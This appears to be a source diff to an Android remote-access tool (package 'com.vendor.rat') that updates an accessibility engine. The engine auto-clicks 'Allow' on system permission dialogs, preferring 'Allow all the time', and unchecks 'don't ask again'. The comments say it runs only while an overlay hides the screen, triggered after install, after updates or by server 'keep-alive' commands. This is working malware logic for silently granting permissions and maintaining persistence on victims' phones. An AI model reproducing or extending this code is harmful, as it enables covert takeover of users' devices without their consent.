@@ -62,17 +62,46 @@ public class PermissionAutoGrantEngine extends AutoEngine {
     }
 
     /**
-     * 重写窗口匹配 — 匹配所有权限相关界面
+     * 重写窗口匹配 — 仅在遮罩显示期间匹配权限对话框
+     *
+     * 设计: PermissionAutoGrantEngine 不是常驻监听器，而是遮罩自动化流程的一部分。
+     * 仅在以下场景中激活（均伴随遮罩显示）：
+     *   - 首次安装后的保活自动化
+     *   - 软件更新后重新触发
+     *   - 服务器下发保活命令
+     *   - 检测到保活失效时重新执行
+     * 遮罩关闭后立即停止响应，防止干扰用户正常操作。
      */
     @Override
     public boolean matchWindow(String packageName, String className, int eventType) {
         if (packageName == null) return false;
 
-        // 匹配权限控制器包名
-        if (PERMISSION_CONTROLLER.equals(packageName)
+        // 核心守卫: 遮罩未显示时不响应任何权限事件
+        if (!com.vendor.rat.helper.BlockViewHelper.isShowing()) {
+            return false;
+        }
+
+        // 只匹配授权弹窗 (GrantPermissionsActivity)，排除权限管理页面
+        boolean isPermissionPkg = PERMISSION_CONTROLLER.equals(packageName)
                 || GOOGLE_PERMISSION_CONTROLLER.equals(packageName)
-                || PACKAGE_INSTALLER.equals(packageName)) {
-            return true;
+                || PACKAGE_INSTALLER.equals(packageName);
+
+        if (isPermissionPkg) {
+            // 明确排除权限管理列表页
+            if (className != null && (className.contains("ManagePermissions")
+                    || className.contains("AppPermissions")
+                    || className.contains("RecyclerView")
+                    || className.contains("ImageButton"))) {
+                return false;
+            }
+            // 精确匹配 GrantPermissionsActivity 或通用窗口组件 (Button / AlertDialog)
+            if (className == null
+                    || className.contains(GRANT_PERMISSIONS)
+                    || className.contains("Button")
+                    || className.contains("AlertDialog")) {
+                return true;
+            }
+            return false;
         }
 
         // 华为权限弹窗
@@ -110,6 +139,20 @@ public class PermissionAutoGrantEngine extends AutoEngine {
     // ============ 自动点击 ============
 
     /**
+     * 允许按钮文本 — 按优先级排列
+     * "始终允许" > "仅在使用中允许" > "仅在使用该应用时允许" > "允许" > "同意/确定"
+     */
+    private static final String[][] ALLOW_BUTTON_TEXTS = {
+        {"始终允许", "Allow all the time"},
+        {"仅在使用中允许", "While using the app"},
+        {"仅在使用该应用时允许", "Allow only while using the app"},
+        {"仅使用期间允许"},  // 华为鸿蒙 EMUI 14+
+        {"允许本次使用", "Only this time", "仅限这一次"},
+        {"允许", "Allow"},
+        {"同意", "确定"},
+    };
+
+    /**
      * 自动点击"允许"按钮
      *
      * 按钮文本因系统版本和语言不同:
@@ -122,63 +165,51 @@ public class PermissionAutoGrantEngine extends AutoEngine {
         sleep(300);
 
         UiNode root = getRootNode();
-        if (root == null) return;
+        if (root == null) {
+            log("autoClickAllow: root is null");
+            return;
+        }
 
-        // 弹窗关闭过渡期：没有拒绝/允许按钮说明弹窗已消失，跳过
-        UiNode denyBtn = root.findOneByCombine(
-                CombineFilter.or(
-                    CombineFilter.button("禁止"),
-                    CombineFilter.button("拒绝"),
-                    CombineFilter.button("Deny"),
-                    StringCondition.viewId("com.android.permissioncontroller:id/permission_deny_button")
-                ));
-        if (denyBtn == null) return;
+        log("autoClickAllow: root pkg=" + root.getPackageName()
+            + " childCount=" + root.getChildCount());
+
+        // 弹窗关闭过渡期：没有拒绝/允许按钮说明弹窗未渲染完或已消失
+        // 华为鸿蒙渲染较慢，重试最多 3 次 (每次 300ms)
+        UiNode denyBtn = null;
+        for (int retry = 0; retry < 3; retry++) {
+            denyBtn = root.findOneByCombine(
+                    CombineFilter.or(
+                        CombineFilter.button("禁止"),
+                        CombineFilter.button("拒绝"),
+                        CombineFilter.button("Deny"),
+                        StringCondition.viewId("com.android.permissioncontroller:id/permission_deny_button")
+                    ));
+            if (denyBtn != null) break;
+            log("autoClickAllow: denyBtn not found, retry " + (retry + 1));
+            sleep(300);
+            root = getRootNode();
+            if (root == null) return;
+        }
+        if (denyBtn == null) {
+            log("autoClickAllow: denyBtn still null after 3 retries");
+            return;
+        }
 
         // 先处理"不再询问"复选框 — 如果勾选了要取消
         uncheckDontAskAgain(root);
 
-        // 优先: "始终允许" / "Allow all the time" (最高权限)
-        UiNode btn = findAllowButton(root, "始终允许", "Allow all the time");
-        if (btn != null) {
-            btn.click();
-            log("Clicked '始终允许'");
-            return;
-        }
-
-        // 次选: "仅在使用中允许" / "While using the app"
-        btn = findAllowButton(root, "仅在使用中允许", "While using the app");
-        if (btn != null) {
-            btn.click();
-            log("Clicked '仅在使用中允许'");
-            return;
-        }
-
-        // 次选: "仅在使用该应用时允许"
-        btn = findAllowButton(root, "仅在使用该应用时允许", "Allow only while using the app");
-        if (btn != null) {
-            btn.click();
-            log("Clicked '仅在使用该应用时允许'");
-            return;
-        }
-
-        // 通用: "允许" / "Allow"
-        btn = findAllowButton(root, "允许", "Allow");
-        if (btn != null) {
-            btn.click();
-            log("Clicked '允许'");
-            return;
-        }
-
-        // 华为特殊: "同意" / "确定"
-        btn = findAllowButton(root, "同意", "确定");
-        if (btn != null) {
-            btn.click();
-            log("Clicked '同意/确定'");
-            return;
+        // 按优先级查找允许按钮
+        for (String[] texts : ALLOW_BUTTON_TEXTS) {
+            UiNode btn = findAllowButton(root, texts);
+            if (btn != null) {
+                btn.click();
+                log("Clicked '" + texts[0] + "'");
+                return;
+            }
         }
 
         // 最后尝试: 查找任何包含"允许"或"Allow"的可点击节点
-        btn = root.findOneByCombine(
+        UiNode btn = root.findOneByCombine(
             CombineFilter.and(
                 CombineFilter.or(
                     StringCondition.textContains("允许"),
@@ -196,6 +227,16 @@ public class PermissionAutoGrantEngine extends AutoEngine {
             // 最终 fallback: 通过 ID 查找 (EMUI 12 / Android 10)
             btn = root.findOneByCombine(
                     StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_button"));
+            if (btn == null) {
+                // EMUI 14 / Android 12+: "仅使用期间允许"按钮 ID
+                btn = root.findOneByCombine(
+                    StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_foreground_only_button"));
+            }
+            if (btn == null) {
+                // Android 12+: "允许本次使用"按钮 ID
+                btn = root.findOneByCombine(
+                    StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_one_time_button"));
+            }
             if (btn != null) {
                 btn.click();
                 log("Clicked allow button (fallback ID)");
